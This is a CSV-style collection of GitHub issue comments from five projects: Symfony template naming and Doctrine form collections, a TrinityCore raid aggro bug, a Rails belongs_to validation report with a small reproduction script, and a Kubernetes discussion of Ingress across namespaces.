symfony/symfony/3150/3548964,3150,@friend the issue is where would a template named MyTrivial.html be found ? And the error Unable to find template comes from Twig. And it is right. The template with this name does not exist. And the name of the template is not the same thing that the name of the file in which you store it (it does not even need to be stored in a file. You could write a Twig loader loading templates from a database) ,,False
symfony/symfony/3150/3551954,3150,"Ok, I'm new to Symfony2. But I'm a 20+ years developer with experience in hardware-design, and thus not new to complex system / framework design. You are familiar with Symfony2, and that's exactly the reason why you don't see the obvious flaws in it. ""include"" is a known construct, with known functionality and behavior  (see e.g. apache SSI, or xiinclude for the web-domain). MyTrivial.html would be found in the same directory like the template including it. If you change this (commonly known) ""include"" behavior in Symfony2, then you should change all related information, including error messages. But as I'm mainly interested to go on, my main question is Can I change the configuration somewhere, thus I can include a simple ""MyTrivial.html"", too? If not, which would be the easiest way add such functionality via code? ",,False
symfony/symfony/3150/3552046,3150,"@friend even when using Twig standalone with its FilesystemLoader, include would not load a template from the current directory but relative to the path configured in the loader (which is how the name of templates is build in this loader). Symfony2 is not changing the meaning of the Twig include tag at all. It simply has a different way to name the template. The Twig environment does not know at all where the template is stored. Templates are always referenced by name. ",,False
symfony/symfony/3150/3552811,3150,"Well, I guess then that Symfony2 is just doing perfect, and users just want the wrong things.  I guess I'll stop to try to enhance the product (Symfony2) and will simply start to silently implement my things locally. Seems like a twig extension is the way to go. ",,False
symfony/symfony/3150/3554610,3150,"Well, I think there should really be a possibility to include raw HTML in core (i.e. without engine). ",,False
symfony/symfony/3150/3556096,3150,"Symfony2 Standard Edition is the whole stack of Symfony2 components combined in such a way to enable creation of MVC apps (correct me if I'm wrong) with some extras added such as TWIG engine for templates/views, Doctrine2 for models and some other bundles/libs. I don't see where in the core you could be using HTML and for what. Also since you're suggesting to add .html files support, why not allow for .php.inc, .inc.php, .htm and so on inclusions. Please correct me if I'm wrong. As for the original problem, I believe both @friend and @friend did a great job on explaining how things work in Sf2. So instead of improving the framework for you only, just submit a PR with a template engine that is able to load .html files directly so that everyone can benefit from your work just as well as you can benefit from the work of the others. If it should not be merged then just make a bundle out of it and publish it ) And if you don't like the error message thrown, just submit a issue report for it or, even better, a PR with an enhanced message. ",,False
symfony/symfony/3150/3556232,3150,"well, the point is that Twig could be able to include an HTML file using {% include %} it is a valid Twig template (without any logic in it at all). But it needs to have a name able to be handled by the loader registered in Twig. As a template name needs to be unique (it is the identifier to find the template), Symfony2 use a naming scheme which includes the bundle name to avoid collisions. And as it supports using several engines, it uses the extension to find the appropriate engine when rendering the template and so enforces such naming (the extension is used to find the engine so Twig templates needs to end with .twig). @friend regarding including .inc.php files in the templates, it makes no sense at all. It would kill totally the fact that Twig does not allow running arbitrary PHP code. ",,False
symfony/symfony/3150/3559304,3150,What about an exception in the template name parser if the name isnt correct? Ran into this issue when using twig to render templates for emails. ,,False
symfony/symfony/3150/3559381,3150,@friend this would make the loader unusable within a ChainLoader. The error message in Twig could probably be improved though to mention that it searches the template by name. ,,False
symfony/symfony/3150/3560618,3150,"@friend it actually does but then uses a regular Twig loader to look for the file. @friend this means that what you are looking for is possible out of the box. You have to create a template loader service (i.e. ), add the paths (by calling ) and configure the templating system to use this loader. ",,False
symfony/symfony/3150/3563042,3150,"@friend thank you for the hint. This is peanuts for me, but far to complex for a simple user. And I ""emulate"" many times a simple user, because I'm simply to ""lazy"" to make such effort where a simple config option would do the work. That's why I use a framework to reduce effort. Now, the main thing here is the core developers should listen to the user expectations, thus the default behavior is near-to-user-expectations. I understand the technical limitations, but there are possible solutions a) Clarify the error message to something like ""please use template name, e.g. ""page.html.twig"" or ""YourBundlepage.html.twig"" and ensure it has valid extension which referes to the template engine (.twig, ...)"". b) Provide a configuration option ""allow_raw_includes"", which handles unspecified templates (.html) c) Provide a construct like this {% include file='global_right.html' %}  d) Provide a construct like this {% include_raw 'global_right.html' %}  Which directions (a/b/c/d) would be the most possible to be accepted for inclusion into the main code? ",,False
symfony/symfony/3150/3563185,3150,"@friend The error message is thrown by Twig. So it cannot include stuff related only to the Symfony2 loader (other loaders will have different patterns for valid template names) And loading a file relatively to the current template location would require changing totally the way Twig works (removing most of the possibilities for the loader) as currently a template itself never knows where it is stored (not even if it is stored in a file, or stored at all as there is a StringLoader btw). So you cannot find something relatively to this location. ",,False
symfony/symfony/3150/3563963,3150,"Let's clarify this issue (look at the FileSytemLoader) When you try use a template which name pattern differs from  then you will fallback to the Twig Loader. So as of today the error message is not so bad it assumes you are not using the symfony syntax so it only print that the file could not be found. May be there is a little room for improvement by adding more precision to the error message, something like ""Either you have specified an invalid template name or the template can not be found"". ",,False
symfony/symfony/3150/3565218,3150,"@friend, can you please for one moment stop thinking that there are no other developers which can overcome those (peanuts-) issues? There are people capable of seeing solutions and paths where you just see problems and barriers. And of course there's another thing we're not talking about a control-software for a nuclear plant. It's a simple framework. So, hypothetically, which directions (a/b/c/d) would be the most possible to be accepted for inclusion into the main code? (if they overcome any possible problems you mention). ",,False
symfony/symfony/3150/3568550,3150,"@friend - you take existent code as a foundation to analyze the issue. I take user expectations as a foundation, and really don't care about the code. I've enough with this error message. To be blunt it's crap! ",,False
symfony/symfony/3150/3568924,3150,I see no issue - at least not in the framework. ,,False
symfony/symfony/3150/3569512,3150,"You're not the only one who does not see the issue / issues. And that's in essence the main issue. Hopefully I get at least the hypothetical answer, thus I can go on. ",,False
symfony/symfony/3150/3605572,3150,"@friend well the problem with your expectations is that you want a ""do as i think"" system. in order to provide what you need, we would need to simply the out of the box possibilities. aka if we dumb the system down, we could figure out what you want. but as with the current flexibility you could have any number of possibilities. as noted however there are two solutions that could move things closer to your desired behavior 1) add handling for ""raw html"" to twig 2) add a ""raw html"" template engine option to the framework bundle finally some advice to you work on your attitude. ",,False
symfony/symfony/3150/3726925,3150,"@friend My attitude? The only attitude which has to change is this of the Symfony2 team agianst the userbase. Sorry, users (especially the one who contacted me in privat), as you see I'm forced to do development locally. ",,False
symfony/symfony/3150/3727880,3150,@friend lsmith77 told you how to add support for your feature. Now you you could implement it and share your work with the community via PR. No need to rant. ,,False
symfony/symfony/3150/3735146,3150,"@friend could you please come down ) The system is flexible and implemented this way to support more than one templating engine. If we where to do what you want, the system would not be flexible enough to support Smarty or any other engine. As several of other members of the community have stated here, it is possible for you to implement the  twig tag yourself and even share it with the world through a bundle. There is nothing that forces you to develop this locally especially if other will benefit from it. Lastly. I aswell must advice your to adjust your attitude. Symfony2 is FREE and developed by people mostly in their sparetime. Some of us are lucky enough to work with it in our day to day life but that is far from true for all. Have a nice day! ",,False
symfony/symfony/3150/3811747,3150,"@friend once more implementing it is peanuts, that it get's into the code is another thing. The team usually ignores PR's, even issues subjecting defects in coding-standards  get serious, please. At least all other people have spared me this typical Open-Source whining thing. ",,False
symfony/symfony/3150/6876224,3150,closing as a duplicate of #3696 ,,False
TrinityCore/TrinityCore/20714/268463888,20714,"Description If I am inside Naxxramas, I can pull one of Anub'rekhan's Crypt Guards without aggroing the other Crypt Guard or Anub'rekhan himself. Current behaviour It is possible to aggro only Anub'rekhan or one of the Crypt Guards if we aggro them from the side. Expected behaviour Pulling any of the Crypt Guards or Anub'rekhan himself will result in all of them getting aggroed. Steps to reproduce the problem  CHANGEME Step 1 include entries of affected creatures / items / quests with a link to the relevant wowhead page.   Step 2 Step 3  Branch(es) 3.3.5, I don't know which branch TC rev. hash/commit TrinityCore rev. 607034064f04 2017-10-07 171334 +0200 (3.3.5 branch) (Win64, RelWithDebInfo, Static) (authserver) TDB version  TDB_full_world_335.63_2017_04_18 Operating system Windows 10 ",,False
TrinityCore/TrinityCore/20714/339509838,20714,"Is it normal, Crypt Guards appears only on 25man? ",,False
TrinityCore/TrinityCore/20714/339548877,20714,"So I should post the top one which you said will work in the querry, or will it be updated in the official TC? ",,False
TrinityCore/TrinityCore/20714/339630414,20714,"One more thing @friend, the query you added does work if Anub'rekhan is pulled first, however it does not work if his Crypt Guards are pulled first, I can still pull each one of them from the side, kill them and then engage the boss without adds at the start. ",,False
TrinityCore/TrinityCore/20714/339675415,20714,"No this must be fixed in core side, also when you pull the boss a set combat with zone is called and the 2 guards will enter the combat. ",,False
TrinityCore/TrinityCore/20714/339741989,20714,Maybe @friend would like to pick up the challenge to see if he can find out what can be done about that action in the SAI core source? ,,False
TrinityCore/TrinityCore/20714/339761062,20714,"It would be incredible if someone could start working on this issue, since it creates a lot of problem in MC and sub-raids on my server which is  hosting vanilla as end-game content, is there a forum where I can ask some more complicated questions about TC? ",,False
TrinityCore/TrinityCore/20714/339777498,20714,"Was digging into this issue earlier, call for help only works when creature has a victim so its kinda buggy for some reason when used with aggro event (didnt have time to check why, through) You can use SET_IN_COMBAT_WITH_ZONE (38) with target CREATURE_GUID (10), but it may be a bit of a hack. ",,False
TrinityCore/TrinityCore/20714/339779850,20714,The easiest way is to delay the call of help by 1 secs. ,,False
TrinityCore/TrinityCore/20714/339780206,20714,@friend I think thats even more hacky solution than mine tho D ,,False
TrinityCore/TrinityCore/20714/339781268,20714,"@friend maybe not - it might sound strange, but in some of my almost expired memories from WotLK retail I recall creatures waiting 1-2 seconds before answering a call for help P ",,False
TrinityCore/TrinityCore/20714/339783296,20714,"@friend alright, fair enough, still weird tho ",,False
TrinityCore/TrinityCore/20714/339788384,20714,Yes it makes sense the text is displayed then after 1-2 secs npcs will enter combat. ,,False
TrinityCore/TrinityCore/20714/339793137,20714,"Just put call of combat with boss, when Crypt Guards enter in combat (you can do it using EnterCombat(Unit* who) in a ScriptedAI) ",,False
TrinityCore/TrinityCore/20714/339795251,20714,Yes but in this case the SAI action mut be fixed. ,,False
TrinityCore/TrinityCore/20714/339929719,20714,Will an issue like this be fixed in the 3.3.5 branch or will I have to do this manually? ,,False
TrinityCore/TrinityCore/20714/339969755,20714,"Ideally it will be fixed in the TC source (3.3.5 / master), but it depends on someone coming up with a working solution. ",,False
TrinityCore/TrinityCore/20714/339974429,20714,"One solution would be to add second optional parameter victim to CreatureCallForHelp. If noone comes up with better solution, I will open a PR with it. ",,False
TrinityCore/TrinityCore/20714/340289990,20714,Why nobody talks about formations? D ,,False
TrinityCore/TrinityCore/20714/340290080,20714,"Sometimes you can't put creatures into formations like when they already are in one or, in this case, they're temporary summons ",,False
TrinityCore/TrinityCore/20714/340290650,20714,"That's why I had a feeling that I am stupid and missed something, because four days and nobody's talking about formations.. there must be a reason. ",,False
TrinityCore/TrinityCore/20714/340526812,20714,"I'm new to Trinity, but how many people are working on it? ",,False
TrinityCore/TrinityCore/20714/340597626,20714,"Since working implies, by definition, some sort of revenue, 0 ",,False
TrinityCore/TrinityCore/20714/340667289,20714,"Yes, it all depends on how you define ""working"" or what you actually want to know. There is a certain number of members in the TrinityCore organization, but some are inactive and some are more active than others. And like ccrs said, none of them receive a salary. ",,False
TrinityCore/TrinityCore/20714/415158337,20714,"If you wanna pay me a full-time job I'll gladly work on this silly project. Until then, you get fixes when they happen. ",,False
TrinityCore/TrinityCore/20714/415166860,20714,closed by 79f0e55 ,,False
TrinityCore/TrinityCore/20714/415585161,20714,"Apologies for the attitude in the past @friend , I didn't want to come off that way, I'm very grateful for the fix! ",,False
rails/rails/31437/281929378,31437,"If child association will fail on its validation rules then I receive ActiveRecordNotNullViolation after parent save In this case, belongs_to validation doesn't work ",,False
rails/rails/31437/351740685,31437,"I tried but couldn't reproduce the issue, can you please try to provide an executable reproduction script by using the information given in this page? ",,False
rails/rails/31437/351884253,31437,"frozen_string_literal true begin   require ""bundler/inline"" rescue LoadError =&gt; e   $stderr.puts ""Bundler version 1.10 or later is required. Please update your Bundler""   raise e end gemfile(true) do   source "" { |repo| "" } Activate the gem you are reporting the issue against. gem ""activerecord"", ""5.1.4""   gem ""sqlite3"" end require ""active_record"" require ""minitest/autorun"" require ""logger"" Ensure backward compatibility with Minitest 4 MinitestTest = MiniTestUnitTestCase unless defined?(MinitestTest) This connection will do for database-independent bug reports. ActiveRecordBase.establish_connection(adapter ""sqlite3"", database ""memory"") ActiveRecordBase.logger = Logger.new(STDOUT) ActiveRecordSchema.define do   create_table companies, force true do |t|     t.string name   end create_table owners, force true do |t|     t.references company, foreign_key true, null =&gt; false   end end class Company &lt; ActiveRecordBase   validates name, presence true, length { in 2..4 } end class Owner &lt; ActiveRecordBase   belongs_to company end class BugTest &lt; MinitestTest   def test_association_stuff     owner = Owner.new     owner.company = Company.new( { name ""too long name"" } )     owner.save   end end ",,False
rails/rails/31437/351964089,31437,"There is no issue with rails. If you try with  option in your owner model it works. But why? The thing is if you don't set  to true then Active Record does not try to save the company relation and since you have not null constraint in your database it raises the exception. What happens when you set  to true is, Active Record tries to save relation but first checks the validations and because of the validation error it rolls back. ",,False
rails/rails/31437/351977405,31437,"I can't agree with your answer... If Company model data will be correct (name length in 2..4) then company will be saved (without this option). belongs_to property (without optional flag) should care that relationship exists, without raising exception on database level! According to documentatin, autosave flag is for different purpose (for saving in update action). ",,False
rails/rails/31437/351990455,31437,"This is from the documentation, which means no matter whether its an update or insert or delete. But here I see that there is an issue with the rails in autosave module. Since the owner belongs to company while saving owner the company should be saved as well so this is what Active Record is trying to do. By default rails saves associated records if they are new records even though the autosave option is not set, kind of an implicit autosave. If you want a workaround you can set  to true till this issue is getting fixed. ",,False
rails/rails/31437/351998099,31437,"Without  flag company is also saved (as you said - implicit save). In my opinion autosave = true should be as default option. When autosave = false, relationship shouldnt be saved. I really don't know why (without autosave option) model is not validated (because autosave is implicitly)? ",,False
rails/rails/31437/352003703,31437,"With or without autosave the parent model is validated. The only difference is when autosave option set as true, the validation failures rollback the transaction. If it's not set, it just ignores the validation error on parent model and tries to save object. As far as I see from the code and test cases, this was done in purpose which does not make sense to me. If the relation is , parent record validation should rollback the entire transaction, otherwise it leads to data integrity issues. In your case since you have not null constraint in database layer, database saves your life but the application itself should have this protection as well. I'll try to fix this behaviour but I can't guarantee it will be merged since I don't know what the Rails team will think and this is kind of a breaking change. ",,False
rails/rails/31437/352006529,31437,"Yes, I fully agreed with you. Database exceptions should be the last way for keeping data consistency ) Thanks for your support. Please update this topic if you will have any news about this. ",,False
rails/rails/31437/357386872,31437,and? ,,False
rails/rails/31437/357645951,31437,Sorry I was on vacation therefore couldn't find time to have a look at this. Maybe someone from Rails core team can give some opinion about the issue. \cc @friend ,,False
rails/rails/31437/359771601,31437,and what do Rails team think? We spent some time to investigate and will be stupid to allow to this subject ,,False
rails/rails/31437/370204670,31437,This is not an issue. Please close. ,,False
rails/rails/31437/370219229,31437,"not issue, really? Please explain. ",,False
rails/rails/31437/373141639,31437,@friend   and ?? ,,False
rails/rails/31437/376331864,31437,@friend  and ? ,,False
rails/rails/31437/378776720,31437,Please can you avoid bumping the issue. Rails is made by volunteers and they usually work in work they are interested. If this issue is so important to you please do investigate a try to open a pull request with the fix. ,,False
rails/rails/31437/381195626,31437,"I asked why not issue, so is it or not? One volunteer confirmed that sth is wrong and why should I forget about it? ",,False
rails/rails/31437/381220086,31437,"I already said there is a problem and mentioned one of the Rails members. Since the issue is not closed by one of them, you can assume that they recognize this as an issue so there is nothing you can do other than waiting for some one to take a stab on the issue or you can come up with a pull request to address the problem. Actually the second option is better than harassing people through a platform where people try to help each other. If you can't come up with a fix, please at least stop pinging the issue, this kind of attitude(it's really annoying to me) does not help, it contrarily keeps away people from involving with the issue. ",,False
rails/rails/31437/404707615,31437,"This issue has been automatically marked as stale because it has not been commented on for at least three months. The resources of the Rails team are limited, and so we are asking for your help. If you can still reproduce this error on the  branch or on , please reply with all of the information you have about it in order to keep the issue open. Thank you for all your contributions. ",,False
symfony/symfony/3201/2998652,3201,"When using entity's in Doctrine with one-many relationships using a form collection, Symfony does not assign the parent entity to the child entity. Using 'by_reference' =&gt; false with cascade-persist fails and the child entity's foreign key is null in the database. The following appears to remedy the issue within the set method which accepts an ArrayCollection within the entity. Surely Symfony should do this within bindRequest in the form itself? ",,False
symfony/symfony/3201/3693492,3201,"The form component does not know anything about Doctrine, which has a requirement to update the owning side of the relation. Btw, if you don't set the hub when adding a link, it will always fail to add it. This is why it is recommended to do -&gt;setHub() in the setter of the inversed side. This is a Doctrine requirement which is documented in the doctrine doc about relations. altering the Symfony form component for such cases is wrong as it would couple it to Doctrine (to be able to detect inversed-side of relations) Btw, this requirement is one of the reason why the code generated by the EntityGenerator should be considered as a starting point for the entities, not as a ready-to-be-used-blindly code. ",,False
symfony/symfony/3201/3693807,3201,"Hey Christophe, I'm aware of the need to set the hub in Doctrine as I've used it outside of Symfony, however the documentation doesn't make it clear that you need to do this. The assumption is (based on the Symfony documentation) that you do not need to set the the owning side of the relationship explicitly and that Symfony will handle this for you... I would be happy to update this for you to avoid confusion to new Symfony developers. ",,False
symfony/symfony/3201/3693941,3201,"Where does the Symfony2 doc tell you that it does some magic to allow you not to do stuff required by Doctrine in its documentation ? If it really says this, we need to change the doc. ",,False
symfony/symfony/3201/3694121,3201,"It doesn't, that's my point. Someone new to Symfony like me will assume that Symfony will handle all of this... as the documentation doesn't explain how Symfony and Doctrine handle this. from -  in the sample code in the cookbook, it doesn't mention that what you have to do to associate a tag with a task in order to persist it in Doctrine... ",,False
symfony/symfony/3201/3694172,3201,"The data are indeed transferred to the underlying object (check your hub object you were editing and it will have the links) But your underlying object is the inversed side of a relation so Doctrine does not track changes in it. the cookbook you linked explicitly talks about a ManyToMany relation, and in this case, the collection can be the owning side. ",,False
symfony/symfony/3201/3694465,3201,"I did, and it does send an ArrayCollection to the setLinks method. My problem is that Symfony only does half of the work and doesn't handle associating those links with the Hub by calling setHub($hub) on each Link that Symfony processes when the form is submitted. This results in a NULL value being inserted into the Links table for the hub_id. This now means that you have to explicitly add the association within the Doctrine Link entity by looping over each Link in the ArrayCollection passed to the setLinks method. I think this documentation clearly needs to be updated, if you read through the code, it's clear that this is a OneToMany relationship as getTasks and setTasks aren't even in the Tag entity. It's worth noting that this happens within our application and a vanilla install of Symfony, the same issue can be found here  however the solution doesn't seem to work for the current distro of Symfony ",,False
symfony/symfony/3201/3694756,3201,"Well, of course it does not call it. You are editing the Hub object in your form, and telling the Form component to access a links property (which is done using getLinks and setLinks). why should the form component assume that it it should do an inversed work on the objects ? It does not know how your objects works. Looping over the collection in the setLinks method is what Doctrine requires fot the inversed side. And regarding the cookbook entry, the note at the beginning *explicitly mentions a ManyToMany. And your remarks let me think you confuse what a ManyToMany relation is and what a bidirectional relation is. A ManyToMany does not need to be bidirectional. And even more, if it was a OneToMany, it would logically be the inversed side of a ManyToOne and in this case you would have to have a getTask and a setTask methods So no, it is absolutely not clear it is a OneToMany. ",,False
symfony/symfony/3201/3694936,3201,"Well I have to apologise to you then, me and my team are obviously stupid and misreading the Symfony documentation and haven't spent the last day or two trying to figure out why the Symfony documentation is so crap and not explicit with the way in which the Form component handles associations with Doctrine, something that other PHP frameworks are quite clear on. The fact that the Cookbook itself is incomplete says a lot, and your attitude towards people looking for support is even worse. Thanks a bunch! ",,False
symfony/symfony/3201/3695016,3201,"well, the cookbook is not incomplete. first, this one is not about Doctrine and second, Doctrine never requires using bidirectional relations everywhere  the form component does not handle anything ""with Doctrine"". It handles things with objects, whatever they are. It is totally decoupled from Doctrine. Best way to see it is to look at the code in the Symfony\Component\Form namespace there is not a single reference to code from the Doctrine namespace there. ",,False
symfony/symfony/3201/3695239,3201,"I don't mean to argue but at the bottom of the cookbook it clearly says. No it doesn't, but any developer (including my team) will look at those entity's and tell you that's it's not clear that it's a ManyToMany association/relationship. Even so, the example code is clearly using doctrine otherwise it wouldn't have  within the entity. What's the point of confusing a reader into thinking that Doctrine is not being used for this cookbook when it's clearly used as an example. Surely it makes sense given the fact that Doctrine is the prime ORM used for Symfony to at least have a cookbook showing how to do this specifically for Doctrine? ",,False
symfony/symfony/3201/3695250,3201,"The cookbook has been completed since, but the website is not yet regenerated. ",,False
symfony/symfony/3201/3695260,3201,I rest my case ,,False
symfony/symfony/3201/3695398,3201,I don't mean to sound out of place but... ,,False
symfony/symfony/3201/3695450,3201,"yeah, there is an issue when you don't use by_reference = false. But even if we fix it, you will still have to implement the update of the owning side for Doctrine. The issue when updating the collection by reference currently is that it does not call the setter at all ",,False
symfony/symfony/3201/3695558,3201,"Even with  it doesn't work. It's clear that the issue here is the fact that the documentation doesn't match up to the expected behaviour from Symfony. So the docs need to be updated and be clear about what Symfony does and does not do in the interim. This will stop developers from smashing their heads against their screens trying to figure out why the expected behaviour isn't as it should be. I'm sure other people working on time sensitive projects will agree that if we know what Symfony does and does not do with Doctrine it will save time and prevent headaches. We've moved from Zend to Symfony over here and are gradually porting our much larger projects over to Symfony. It's a great framework and we love it, but the documentation is really lacking a little which is causing us a nightmare! ",,False
symfony/symfony/3201/3695657,3201,"well, with by_reference = false, it works when you do what Doctrine requires for its inversed side relations ",,False
symfony/symfony/3201/3695919,3201,"again, this should be clear in the Symfony documentation, especially when it comes with Doctrine integration as standard as well as having tutorials about using Symfony with Doctrine. My problem isn't with Symfony code, it's with the lack of documentation explaining how collections in forms work and what's expected of the developer to ensure that they persist correctly. ",,False
symfony/symfony/3201/285966695,3201,You can get the solution in this tutorial Good Work Link ,,False
kubernetes/kubernetes/17088/116263695,17088,As far as I can tell right now it's only possible to create an ingress to address services inside the namespace in which the Ingress resides. It would be good to be able to address services in any namespace. It's possible that I'm missing something and this is already possible - if so it'd be great if this was documented. ,,False
kubernetes/kubernetes/17088/155917963,17088,"Nope, not allowing this was a conscious decision (but one that I can be convinced against). Can you describe your use case? The beta model partitions users on namespace boundaries and disallows service sharing across namespaces. You might argue that you want a single loadbalancer for the entire cluster, to which I ask, what is in the namespaces? i.e why not use 1 namespace if you want to allow sharing. ",,False
kubernetes/kubernetes/17088/155918432,17088,"@friend I'm running multiple projects on a cluster - kubernetes tests, blog, API for a project. I want to address these as subdomains on my domain using a single ingress controller because load balancers and IP addresses are expensive on GCE. ",,False
kubernetes/kubernetes/17088/156287304,17088,It was intentionally avoided. Cross namespace references would be a prime source of privilege escalation attacks. cc @friend/kube-iam ,,False
kubernetes/kubernetes/17088/157181041,17088,"I'll close this for now, makes sense. ",,False
kubernetes/kubernetes/17088/157187876,17088,"FWIW you can set up a Service in namespace X with no selector and a manual Endpoints that just lists another Service's IP.  It's yet another bounce, but it seems to work. ) On Thu, Nov 12, 2015 at 514 PM, Jordan Liggitt notifications@friend.com wrote ",,False
kubernetes/kubernetes/17088/157926226,17088,I would tend to imagine the use case that @friend described is common.  I'm looking at an ingress controller as a system component and a means of reflecting any service in the cluster to the outside world.  Running one (perhaps even in the  namespace) that can handle ingress for all services just seems to make a lot of sense. ,,False
kubernetes/kubernetes/17088/157927772,17088,That depends on what you have in your namespaces right (which is why i asked for clarification)? Isn't it only risky IFF you're partitioning users across a namespace security boundry? ,,False
kubernetes/kubernetes/17088/162258789,17088,There seems to be demand for cross namespace ingress x service resolution. We should at least reconsider. ,,False
kubernetes/kubernetes/17088/170397539,17088,Might be good to revisit this now in 2016 ) ,,False
kubernetes/kubernetes/17088/170955624,17088,@friend/kube-iam thoughts/volunteers to implement an admission controller? Do we authorize based on the user field of a request today or is that unprecedented? ,,False
kubernetes/kubernetes/17088/170960222,17088,"I think I'd want some record or indication of the cross-namespace relationship to exist, so the targeted service could know it was exposed. I want to avoid the scenario where someone had access to a service (legitimately or otherwise), set up ingress from other namespaces, then had their access removed and continued accessing the services without the service owner's awareness. The authorization layer is based on the user info on a request. This would be the first objectref authorization I know of. ",,False
kubernetes/kubernetes/17088/173379992,17088,"@friend's raises some good concerns.  I broke them down into two cases when thinking about them.  assuming everyone is trustworthy, it might still be hard to reason about the network security of a service just by looking at the service object (or just by looking at objects in the same namespace).  IT might be misconfigured.  I agree with this, to a point however, creating an object that represents a connection between two services seems like it would scale poorly.   we need a solution that scales with the number of services, not the number of interconnections, I think.   assuming there is someone not-trustworthy, they can misconfigure they network in a way where the misconfiguration persists after some of their access is revoked. Yes.  But we have this problem worse with pods, configmap, etc.  The bad actor might have run pods that that are doing the wrong thing, and auditing this is very hard.    ",,False
kubernetes/kubernetes/17088/173836967,17088,"Is this moving into the topic of micro-segmentation and access policy? On Wed, Jan 20, 2016 at 219 PM, Eric Tune notifications@friend.com wrote ",,False
kubernetes/kubernetes/17088/174039921,17088,"The two main models proposed for network segmentation are 1) decorate Services (and maybe Pods) with a field indicting ""allow-from"". This basically allows one to draw the directed graph of an application, sort of. 2) implement a ""policy group"" object which selects Pods to which to apply policy, and includes some simple policy statements like ""allow-from"" On Thu, Jan 21, 2016 at 1152 PM, Tim Hockin notifications@friend.com wrote ",,False
kubernetes/kubernetes/17088/174041517,17088,@friend what issue does one go to to learn more and comment? ,,False
kubernetes/kubernetes/17088/174042505,17088,"It's being discussed in the network SIG mailing list as we haggle over multitudes of ideas and whittle it down to a few viable ones. Start here  proposal  is in email  Fri, Jan 22, 2016 at 1246 PM, Eric Tune notifications@friend.com wrote ",,False
kubernetes/kubernetes/17088/174085075,17088,"Talked to @friend and @friend  It sounds like the Ingress resource may undergo some refactoring this quarter, possibly splitting into two objects.  We should revisit ingress security when those discussion happen. ",,False
kubernetes/kubernetes/17088/212615169,17088,"This would be a nice feature to have.  For example, someone who wants to offer  a pseudo multi-tenant solution - with each tenant running in a separate namespace.  The ingress could do hostname based routing to the right backend namespace.   ${tenant}.example.com  -&gt;  service ""foo"" in namespace ${tenant} I suppose one can do this today on GKE, but I gather you end up with one HTTP load balancer per namespace  - which could get quite expensive and seems unnecessary. ",,False
kubernetes/kubernetes/17088/221380052,17088,"This limitation throws a big wrench in how my company was planning to use ingresses. Our use case is running multiple copies of the same application stack at different versions, and to keep the stacks isolated from each other, we use namespaces. We'd planned to run a single ingress controller that knows how to determine which applications and versions of those applications by the subdomain of the incoming requests. The reason for using namespaces for isolating these stacks are  To be extra safe about not having applications interfere with each other based on what else happens to be running in the cluster or from similarly named services. To get around name collisions for services. It's not possible to have two services in the same namespace with the same name, so application dependencies like ""redis"" or ""mysql"" need to be in different namespaces to use those simple names without faking a namespace by changing the name of the service.  See my unanswered Stack Overflow question, Kubernetes services for different application tracks, for more details on our use case. Our ingress controller is exposed to the outside world via NodePort (80 and 443), and we have an ELB in AWS pointing at the whole cluster. With the namespace restriction for ingresses, we'd need one ingress controller per namespace and there would be no way to have a single ELB forwarding ports 80 and 443 to the cluster. ",,False
kubernetes/kubernetes/17088/221393102,17088,"@friend You should use the approach that our group is using for Ingresses. Think of an Ingress not as much as a LoadBalancer but just a document specifying some mappings between URLs and services within the same namespace. An example, from a real document we use We make one of these for each of our namespaces for each track. Then, we have a single namespace with an Ingress Controller which runs automatically configured NGINX pods. Another AWS Load balancer points to these pods which run on a NodePort using a DaemonSet to run at most and at least one on every node in our cluster. As such, the traffic is then routed Internet -&gt; AWS ELB -&gt; NGINX (on node) -&gt; Pod We keep the isolation between namespaces while using Ingresses as they were intended. It's not correct or even sensible to use one ingress to hit multiple namespaces. It just doesn't make sense, given how they are designed. The solution is to use one ingress per each namespace with a cluster-scope ingress controller which actually does the routing. All an Ingress is to Kubernetes is an object with some data on it. It's up to the Ingress Controller to do the routing. See the document here for more info on Ingress Controllers. With this post I will close this issue because I think it's actually a non-issue - Ingresses work fine even for cross namespace routing. Eventually the ingress object might be refactored / split. That would be a redesign of this concept. But as of now, this is how Ingresses are designed and meant to be used, so it only makes sense to use them the ""right"" way ) ",,False
kubernetes/kubernetes/17088/221395779,17088,I might open up another issue about actually properly documenting this with examples. Seems there's some confusions around Ingresses. They're really powerful when applied correctly. ,,False
kubernetes/kubernetes/17088/221410555,17088,"I think your @friend was the wrong person. P I understand the difference between ingress resources and the ingress controller, but I'm not sure I understand why my use case is not appropriate here, or how the setup you describe does the same thing we're trying to do. In our imagined setup, the ingress controller and all ingress resources exist in one namespace. However, we create ingress resources that map host names to services in more than one namespace. This way we can access apps from outside the cluster as ""my-app.app-version.example.com"" and the request follows the path ELB ♢ random node ♢ ingress controller ♢ my-app in the my-app-my-version namespace. ",,False
kubernetes/kubernetes/17088/221415444,17088,"Yeah whoops. I just assumed the first jimmy in the @ list was you. There's absolutely no reason to have your ingress resources in one namespace, as far as I can tell. What's keeping you from putting the routes for your app into a single Ingress object and then replicating this object for each namespace you want to run? It just makes sense from a symmetry perspective - if every namespace has the same set of objects, including the ingress object, then everything will work properly... ",,False
kubernetes/kubernetes/17088/221426073,17088,"I don't think duplication of ingress objects would be a big deal, but needing an ingress controller for each namespace would be a problem, as we want to have a single entrypoint for requests going into the cluster. If each namespace had it's own ingress controller, we'd need a separate ELB with its own DNS records for each namespace, which is not something we want. ",,False
kubernetes/kubernetes/17088/221440162,17088,"@friend Read through my comment again. I said you would have a single ingress controller for the entire cluster, exactly as you want... ",,False
kubernetes/kubernetes/17088/221442374,17088,"It does look like I misunderstood what this issue was about! It sounds like ingress controllers do work across namespaces, but ingress resources cannot see outside of their own namespaces, which was the subject of this issue. Apologies for the confusion and thanks for your responses! ",,False
kubernetes/kubernetes/17088/222218906,17088,@friend I had the same confusion up to a point. ,,False
kubernetes/kubernetes/17088/274069915,17088,"I read this discussions many times and still do not understand what is the recommended way to achieve the desired goal of multiple sub/domains to be served from different namespaces. My first workaround is to use single namespace with Ingress for everything that should be exposed via domain name to the world. And the second way is to not use Ingress, but a simple Nginx as a proxy to my apps in different namespaces. Isn't the goal of Ingress to simplify this scenario? There is mentions about security implications if crossing the namespace. However, there is no simple explanation of them. @friend Could you please share more details about what are those pods, which reside with the Ingress Controller? ",,False
kubernetes/kubernetes/17088/274549975,17088,"I think I need to be able to reference services in different namespaces from a single ingress controller. My use-case is doing blue/green deployments, with a ""blue"" namespace and a ""green"" namespace. My application's public traffic comes via an ingress controller. I would like to be able to route that traffic to blue or green services via making a small change to the ingress controller (i.e. the service namespace). ",,False
